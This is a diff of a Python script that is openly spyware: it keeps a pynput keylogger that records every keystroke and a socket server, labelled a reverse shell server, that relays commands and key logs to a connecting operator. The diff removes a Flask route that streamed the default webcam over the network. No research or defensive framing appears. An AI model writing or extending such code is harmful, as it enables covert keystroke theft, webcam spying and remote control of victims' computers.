@@ -2,42 +2,20 @@ import socket
 import threading
 import pynput
 from pynput.keyboard import Listener
-import os
 import time
-import cv2
-from flask import Flask, Response
+import os
 
 # Global variable for storing key logs
 key_logs = []
 
-# Flask app for streaming webcam feed
-app = Flask(__name__)
-
-# Function to capture webcam frames
-def gen_frames():
-    cap = cv2.VideoCapture(0)  # Open the default camera
-    while True:
-        success, frame = cap.read()  # Read a frame
-        if not success:
-            break
-        else:
-            # Encode frame as JPEG
-            ret, buffer = cv2.imencode('.jpg', frame)
-            if not ret:
-                continue
-            frame = buffer.tobytes()
-            yield (b'--frame\r\n'
-                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n\r\n')
-    cap.release()
-
-# Keylogger functionality using pynput
+# Function to capture keystrokes using pynput
 def on_press(key):
     try:
         key_logs.append(str(key.char))  # Regular character keys
     except AttributeError:
         key_logs.append(f"[{key}]")  # Special keys (e.g., space, enter)
 
-# Keylogger commands handling
+# Keylogger commands
 def keylogger_commands(connection):
     global key_logs
     while True:
@@ -60,7 +38,7 @@ def keylogger_commands(connection):
             break
         time.sleep(1)
 
-# Reverse shell server
+# Reverse shell server that accepts incoming connections
 def reverse_shell_server(host='0.0.0.0', port=9999):
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind((host, port))
@@ -91,26 +69,6 @@ def reverse_shell_server(host='0.0.0.0', port=9999):
             print(f"Error: {e}")
             client_socket.close()
 
-# Flask route to stream webcam
-@app.route('/video_feed')
-def video_feed():
-    return Response(gen_frames(),
-                    mimetype='multipart/x-mixed-replace; boundary=frame')
-
-# Start Flask server in a separate thread to handle webcam streaming
-def start_flask():
-    app.run(host='0.0.0.0', port=5000, threaded=True)
-
-# Function to run reverse shell server in a separate thread
-def start_reverse_shell():
-    thread = threading.Thread(target=reverse_shell_server)
-    thread.start()
-
+# Start the server to listen for incoming reverse shell connections
 if __name__ == "__main__":
-    # Start Flask server to handle webcam stream
-    flask_thread = threading.Thread(target=start_flask)
-    flask_thread.start()
-
-    # Start reverse shell server to handle reverse shell connections
-    reverse_shell_thread = threading.Thread(target=start_reverse_shell)
-    reverse_shell_thread.start()
+    reverse_shell_server()
